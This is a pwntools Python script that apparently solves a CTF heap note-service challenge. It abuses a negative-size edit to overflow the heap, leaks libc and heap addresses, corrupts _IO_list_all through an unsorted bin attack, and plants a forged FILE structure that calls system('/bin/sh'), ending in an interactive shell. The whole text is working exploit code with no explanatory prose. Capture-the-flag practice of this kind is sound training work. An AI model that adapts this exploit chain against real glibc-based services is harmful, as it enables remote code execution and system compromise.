from pwn import *
from LibcSearcher import *

context(log_level='debug',arch='amd64', os='linux')
pwnfile = "./pwn"
# io = remote("challenge-aa33f598e4074e46.sandbox.ctfhub.com",20723)
io = process(pwnfile)
elf = ELF(pwnfile)
libc = ELF("./libc-2.23.so")

s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r       = lambda num=4096           :io.recv(num)
ru      = lambda delims		    :io.recvuntil(delims)
itr     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))


def add(size,data):
	ru(b"Input your choice >> \n")
	sl(b"1")
	ru(b"How long is your note?")
	sl(str(size))
	ru(b"Please write your note now:")
	s(data)

def show():
	ru(b"Input your choice >> \n")
	sl(b"2")


def edit(idx,size,data):
	ru(b"Input your choice >> \n")
	sl(b"3")
	ru(b"Which note do you want to change?")
	sl(str(idx))
	ru(b"Please input the size of your note:")
	sl(str(size))
	ru(b"Please write your new note:")
	s(data)

gdb.attach(io,'''
b *$rebase(0x00888)
b* $rebase(0xC0F)
b* $rebase(0xBAC)''')
pause()

add(0x20,b"aaaa")
edit(0,-1,p64(0)*5+p64(0xfd1))
add(0x1000,b"a")
add(0x400,b"b"*8)


show()
ru(b"b"*8)
main_arena = uu64(r(6))
libc_base = main_arena-1640-0x10-libc.sym['__malloc_hook']
io_list_all = libc_base+libc.sym["_IO_list_all"]
system = libc_base+libc.sym["system"]
print("libc_base-------------->: ",hex(libc_base))
print("io_list_all-------------->: ",hex(io_list_all))

edit(2,-1,b"c"*0x10)
show()
ru(b"c"*0x10)
heap_addr = uu64(r(6))-0x30
print("heap_addr-------------------->: ",hex(heap_addr))

payload = b"a"*0x400
fake = b"/bin/sh\x00"+p64(0x61)
fake += p64(0)+p64(io_list_all-0x10)
fake += p64(0)+p64(1)
fake = fake.ljust(0xd8,b"\x00")
fake += p64(heap_addr+0x520)
fake += p64(0)*3+p64(system)
payload += fake

edit(2,-1,payload)
ru(b"Input your choice >> \n")
sl(b"1")
ru(b"How long is your note?")
sl(str(0x10))

sl(b"ls")
#gdb.attach(io)



itr()
